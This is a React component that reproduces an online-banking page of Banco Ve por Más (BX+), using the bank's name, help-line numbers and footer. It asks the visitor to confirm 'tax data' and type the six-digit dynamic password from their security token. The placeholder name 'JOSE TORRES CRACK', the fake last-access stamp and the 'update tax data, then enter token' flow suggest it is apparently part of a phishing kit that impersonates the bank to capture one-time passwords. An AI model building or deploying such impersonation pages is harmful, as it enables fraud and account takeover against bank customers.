import React, { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'

const TaxConfirmation: React.FC = () => {
  const [tokenDigits, setTokenDigits] = useState<string[]>(['', '', '', '', '', ''])
  const navigate = useNavigate()
  const location = useLocation()

  // Obtener datos de la pantalla anterior o del estado
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    mobilePhone: '',
    landlinePhone: ''
  })

  useEffect(() => {
    // Obtener datos del sessionStorage o del estado de navegación
    const savedData = sessionStorage.getItem('taxData')
    if (savedData) {
      setFormData(JSON.parse(savedData))
    } else if (location.state) {
      setFormData(location.state)
    } else {
      // Si no hay datos, redirigir a la pantalla anterior
      navigate('/tax-data-update')
    }
  }, [navigate, location])

  const handleTokenChange = (index: number, value: string) => {
    // Filtrar solo números
    const numericValue = value.replace(/\D/g, '')
    
    // Si se pega un valor largo, distribuir los dígitos
    if (numericValue.length > 1) {
      const newDigits = [...tokenDigits]
      const digitsToAdd = numericValue.slice(0, 6 - index).split('')
      
      digitsToAdd.forEach((digit, i) => {
        if (index + i < 6) {
          newDigits[index + i] = digit
        }
      })
      
      setTokenDigits(newDigits)
      
      // Enfocar el siguiente campo disponible o el último
      const nextIndex = Math.min(index + digitsToAdd.length, 5)
      setTimeout(() => {
        const nextInput = document.getElementById(`token-${nextIndex}`)
        nextInput?.focus()
      }, 0)
    } else {
      // Un solo dígito
      const newDigits = [...tokenDigits]
      newDigits[index] = numericValue
      setTokenDigits(newDigits)
      
      // Auto-focus al siguiente campo si hay un valor
      if (numericValue && index < 5) {
        setTimeout(() => {
          const nextInput = document.getElementById(`token-${index + 1}`)
          nextInput?.focus()
        }, 0)
      }
    }
  }
  
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '')
    
    if (pastedData.length > 0) {
      const newDigits = [...tokenDigits]
      const digitsToAdd = pastedData.slice(0, 6 - index).split('')
      
      digitsToAdd.forEach((digit, i) => {
        if (index + i < 6) {
          newDigits[index + i] = digit
        }
      })
      
      setTokenDigits(newDigits)
      
      // Enfocar el siguiente campo disponible o el último
      const nextIndex = Math.min(index + digitsToAdd.length, 5)
      setTimeout(() => {
        const nextInput = document.getElementById(`token-${nextIndex}`)
        nextInput?.focus()
      }, 0)
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tokenDigits[index] && index > 0) {
      const prevInput = document.getElementById(`token-${index - 1}`)
      prevInput?.focus()
    }
  }

  const handleConfirm = (e: React.FormEvent) => {
    e.preventDefault()
    const token = tokenDigits.join('')
    
    if (token.length !== 6) {
      alert('Por favor ingrese los 6 dígitos del token')
      return
    }
    
    // Aquí iría la lógica de confirmación
    // Por ahora redirigimos a acceso
    navigate('/acceso/main')
  }

  const handleGoBack = () => {
    navigate('/tax-data-update')
  }

  return (
    <div className="wrapper dark" style={{ margin: 0, padding: 0 }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#2c3e50',
        color: '#fff',
        padding: '10px 15px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'flex-start',
        flexWrap: 'wrap',
        gap: '10px',
        margin: 0,
        width: '100%'
      }}>
        <style>{`
          @media (max-width: 768px) {
            .header-logo {
              font-size: 16px !important;
            }
            .header-nav {
              font-size: 12px !important;
              gap: 8px !important;
            }
            .header-nav a {
              font-size: 12px !important;
            }
            .header-access {
              font-size: 9px !important;
              min-width: auto !important;
              width: 100% !important;
              text-align: left !important;
              margin-top: 10px !important;
            }
            .header-access div {
              font-size: 9px !important;
              line-height: 1.4 !important;
            }
          }
        `}</style>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap', flex: '1 1 auto' }}>
          <span className="header-logo" style={{ fontSize: '18px', fontWeight: 'bold', whiteSpace: 'nowrap' }}>BX+</span>
          <nav className="header-nav" style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', fontSize: '14px' }}>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>INICIO</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>MIS PRODUCTOS</a>
            <a href="#" style={{ color: '#fff', textDecoration: 'none', whiteSpace: 'nowrap' }}>TRANSACCIONES</a>
          </nav>
        </div>
        <div className="header-access" style={{ fontSize: '11px', textAlign: 'right', minWidth: '200px', flex: '0 1 auto' }}>
          <div>Último acceso al sistema:</div>
          <div style={{ fontSize: '10px' }}>Lunes 15 de diciembre de 2025, 14:36:51</div>
          <div style={{ fontSize: '10px' }}>(c15122025144651)</div>
        </div>
      </header>

      <div className="container" style={{ padding: '20px 15px', maxWidth: '100%' }}>
        {/* Título */}
        <div style={{ textAlign: 'center', marginBottom: '30px', marginTop: '20px' }}>
          <h1 style={{ 
            color: '#4A90E2', 
            fontSize: 'clamp(20px, 5vw, 28px)', 
            fontWeight: 'bold',
            margin: '10px 0'
          }}>
            Consulta y Modificación de Datos Fiscales
          </h1>
        </div>

        {/* Indicador de progreso */}
        <div style={{ 
          textAlign: 'center', 
          marginBottom: '30px',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          gap: '8px'
        }}>
          <div style={{
            width: '12px',
            height: '12px',
            borderRadius: '50%',
            backgroundColor: '#4A90E2',
            border: '2px solid #4A90E2',
            opacity: 0.6
          }}></div>
          <div style={{
            width: '12px',
            height: '12px',
            borderRadius: '50%',
            backgroundColor: '#4A90E2',
            border: '2px solid #4A90E2',
            opacity: 0.6
          }}></div>
          <div style={{
            width: '12px',
            height: '12px',
            borderRadius: '50%',
            backgroundColor: '#4A90E2',
            border: '2px solid #4A90E2',
            opacity: 0.6
          }}></div>
          <div style={{
            width: '14px',
            height: '14px',
            borderRadius: '50%',
            backgroundColor: '#4A90E2',
            border: '3px solid #4A90E2',
            opacity: 1,
            boxShadow: '0 0 8px rgba(74, 144, 226, 0.6)'
          }}></div>
          <div style={{
            width: '12px',
            height: '12px',
            borderRadius: '50%',
            backgroundColor: '#4A90E2',
            border: '2px solid #4A90E2',
            opacity: 0.3
          }}></div>
        </div>

        {/* Sección CONFIRMACIÓN */}
        <div style={{ 
          textAlign: 'center', 
          marginBottom: '30px' 
        }}>
          <div style={{
            display: 'inline-block',
            backgroundColor: '#4A90E2',
            color: '#fff',
            padding: '12px 30px',
            borderRadius: '4px 4px 0 0',
            fontSize: '16px',
            fontWeight: 'bold'
          }}>
            CONFIRMACIÓN
          </div>
          <div style={{
            width: '0',
            height: '0',
            borderLeft: '8px solid transparent',
            borderRight: '8px solid transparent',
            borderTop: '8px solid #4A90E2',
            margin: '0 auto'
          }}></div>
        </div>

        {/* Formulario */}
        <form onSubmit={handleConfirm} style={{ maxWidth: '600px', margin: '0 auto', padding: '0 10px' }}>
          {/* Datos del usuario */}
          <div style={{ marginBottom: '30px' }}>
            <div className="form-group" style={{ marginBottom: '20px' }}>
              <label style={{
                display: 'block',
                marginBottom: '10px',
                color: '#fff',
                fontSize: '15px',
                fontWeight: '700',
                textTransform: 'uppercase',
                letterSpacing: '0.8px',
                textShadow: '0 1px 2px rgba(0,0,0,0.2)'
              }}>
                Nombre completo:
              </label>
              <div style={{
                color: '#2c3e50',
                fontSize: '17px',
                fontWeight: '600',
                padding: '16px 18px',
                backgroundColor: '#e8e8e8',
                border: '1px solid #b8b8b8',
                borderRadius: '4px',
                borderLeft: '4px solid #888',
                boxShadow: '0 2px 6px rgba(0,0,0,0.12)',
                letterSpacing: '0.3px',
                transition: 'all 0.3s ease'
              }}>
                {formData.fullName || 'JOSE TORRES CRACK'}
              </div>
            </div>
            <div className="form-group" style={{ marginBottom: '20px' }}>
              <label style={{
                display: 'block',
                marginBottom: '10px',
                color: '#fff',
                fontSize: '15px',
                fontWeight: '700',
                textTransform: 'uppercase',
                letterSpacing: '0.8px',
                textShadow: '0 1px 2px rgba(0,0,0,0.2)'
              }}>
                Correo electrónico:
              </label>
              <div style={{
                color: '#2c3e50',
                fontSize: '17px',
                fontWeight: '600',
                padding: '16px 18px',
                backgroundColor: '#e8e8e8',
                border: '1px solid #b8b8b8',
                borderRadius: '4px',
                borderLeft: '4px solid #888',
                boxShadow: '0 2px 6px rgba(0,0,0,0.12)',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                letterSpacing: '0.3px',
                transition: 'all 0.3s ease'
              }}>
                <span className="fa fa-envelope" style={{ color: '#555', fontSize: '18px', minWidth: '20px' }}></span>
                <span>{formData.email || 'torrescrack@mexicogiga.c'}</span>
              </div>
            </div>
            <div className="form-group" style={{ marginBottom: '20px' }}>
              <label style={{
                display: 'block',
                marginBottom: '10px',
                color: '#fff',
                fontSize: '15px',
                fontWeight: '700',
                textTransform: 'uppercase',
                letterSpacing: '0.8px',
                textShadow: '0 1px 2px rgba(0,0,0,0.2)'
              }}>
                Teléfono móvil:
              </label>
              <div style={{
                color: '#2c3e50',
                fontSize: '17px',
                fontWeight: '600',
                padding: '16px 18px',
                backgroundColor: '#e8e8e8',
                border: '1px solid #b8b8b8',
                borderRadius: '4px',
                borderLeft: '4px solid #888',
                boxShadow: '0 2px 6px rgba(0,0,0,0.12)',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                letterSpacing: '0.3px',
                transition: 'all 0.3s ease'
              }}>
                <span className="fa fa-mobile" style={{ color: '#555', fontSize: '20px', minWidth: '20px' }}></span>
                <span>{formData.mobilePhone || '666666666666666'}</span>
              </div>
            </div>
            <div className="form-group">
              <label style={{
                display: 'block',
                marginBottom: '10px',
                color: '#fff',
                fontSize: '15px',
                fontWeight: '700',
                textTransform: 'uppercase',
                letterSpacing: '0.8px',
                textShadow: '0 1px 2px rgba(0,0,0,0.2)'
              }}>
                Teléfono fijo:
              </label>
              <div style={{
                color: '#2c3e50',
                fontSize: '17px',
                fontWeight: '600',
                padding: '16px 18px',
                backgroundColor: '#e8e8e8',
                border: '1px solid #b8b8b8',
                borderRadius: '4px',
                borderLeft: '4px solid #888',
                boxShadow: '0 2px 6px rgba(0,0,0,0.12)',
                display: 'flex',
                alignItems: 'center',
                gap: '12px',
                letterSpacing: '0.3px',
                transition: 'all 0.3s ease'
              }}>
                <span className="fa fa-phone" style={{ color: '#555', fontSize: '18px', minWidth: '20px' }}></span>
                <span>{formData.landlinePhone || '666666666666666'}</span>
              </div>
            </div>
          </div>

          {/* Token */}
          <div style={{ marginBottom: '30px', textAlign: 'center' }}>
            <p style={{
              color: '#666',
              fontSize: '14px',
              marginBottom: '20px'
            }}>
              Por favor, ingresa la contraseña dinámica de tu dispositivo Token para continuar.
            </p>
            
            {/* Icono de token */}
            <div style={{ marginBottom: '20px' }}>
              <div style={{
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                backgroundColor: '#f5f5f5',
                border: '2px solid #ddd',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto'
              }}>
                <span className="fa fa-key" style={{ fontSize: '24px', color: '#666' }}></span>
              </div>
            </div>

            {/* Campos de token */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: 'clamp(6px, 2vw, 10px)',
              marginBottom: '30px',
              flexWrap: 'nowrap',
              overflowX: 'auto',
              padding: '0 10px',
              WebkitOverflowScrolling: 'touch'
            }}>
              {tokenDigits.map((digit, index) => (
                <input
                  key={index}
                  id={`token-${index}`}
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={digit}
                  onChange={(e) => handleTokenChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  onPaste={(e) => handlePaste(e, index)}
                  style={{
                    width: 'clamp(40px, 10vw, 50px)',
                    height: 'clamp(45px, 11vw, 50px)',
                    minWidth: '40px',
                    textAlign: 'center',
                    fontSize: 'clamp(18px, 5vw, 24px)',
                    backgroundColor: '#4a4a4a',
                    color: '#fff',
                    border: '1px solid #888',
                    borderRadius: '6px',
                    fontWeight: 'bold',
                    flexShrink: 0
                  }}
                />
              ))}
            </div>
          </div>

          {/* Botones */}
          <div style={{ 
            display: 'flex', 
            gap: '15px',
            marginBottom: '30px',
            flexWrap: 'wrap'
          }}>
            <button
              type="button"
              onClick={handleGoBack}
              className="btn"
              style={{
                flex: '1',
                minWidth: '150px',
                backgroundColor: '#e0e0e0',
                color: '#666',
                border: '1px solid #ddd',
                padding: '14px',
                fontSize: '16px',
                borderRadius: '4px',
                cursor: 'pointer'
              }}
            >
              Regresar
            </button>
            <button
              type="submit"
              className="btn"
              style={{
                flex: '1',
                minWidth: '150px',
                backgroundColor: '#B8E986',
                color: '#fff',
                border: 'none',
                padding: '14px',
                fontSize: '16px',
                fontWeight: 'bold',
                borderRadius: '4px',
                cursor: 'pointer'
              }}
            >
              Confirmar
            </button>
          </div>
        </form>

        {/* Sección de Ayuda */}
        <div style={{
          backgroundColor: '#f9f9f9',
          padding: '20px',
          borderRadius: '4px',
          marginBottom: '30px',
          textAlign: 'center'
        }}>
          <h3 style={{
            color: '#4A90E2',
            fontSize: '18px',
            fontWeight: 'bold',
            marginBottom: '15px'
          }}>
            ¿Necesitas ayuda? Llámanos.
          </h3>
          <p style={{
            color: '#666',
            fontSize: '14px',
            marginBottom: '15px',
            lineHeight: '1.6'
          }}>
            Para solicitudes de aclaración, consultas sobre el estado de operaciones o reclamaciones relacionadas con SPEI y otros servicios de banca electrónica, comunícate con Línea B×+.
          </p>
          <div style={{
            color: '#4A90E2',
            fontSize: '16px',
            fontWeight: 'bold',
            marginBottom: '10px'
          }}>
            Cd. de México y área metropolitana: 55 11 02 19 19
          </div>
          <div style={{
            color: '#4A90E2',
            fontSize: '16px',
            fontWeight: 'bold',
            marginBottom: '10px'
          }}>
            interior de la República: 800 837 6762
          </div>
          <div style={{
            color: '#666',
            fontSize: '14px'
          }}>
            Lunes a domingo las 24 hrs.
          </div>
        </div>
      </div>

      {/* Footer - Fuera del contenedor para que ocupe todo el ancho */}
      <footer style={{ 
        marginTop: '60px', 
        width: '100vw', 
        marginLeft: 'calc(-50vw + 50%)',
        marginRight: 'calc(-50vw + 50%)'
      }}>
        {/* Footer superior verde lima */}
        <div style={{
          backgroundColor: '#B8E986',
          padding: '20px',
          textAlign: 'center',
          width: '100%',
          boxSizing: 'border-box'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            flexWrap: 'wrap',
            gap: '8px',
            fontSize: 'clamp(12px, 2.5vw, 14px)'
          }}>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Preguntas Frecuentes</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Términos y condiciones</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Privacidad</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Seguridad</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Información legal</a>
            <span style={{ color: '#2c3e50' }}>|</span>
            <a href="#" style={{ color: '#2c3e50', textDecoration: 'none', whiteSpace: 'nowrap' }}>Ayuda</a>
          </div>
        </div>
        {/* Footer inferior azul oscuro */}
        <div style={{
          backgroundColor: '#2c3e50',
          color: '#fff',
          padding: '15px',
          textAlign: 'center',
          fontSize: '12px',
          width: '100%',
          boxSizing: 'border-box'
        }}>
          Banco Ve por Más, S.A., Institución de Banca Múltiple, Grupo Financiero Ve por Más.
        </div>
      </footer>
    </div>
  )
}

export default TaxConfirmation

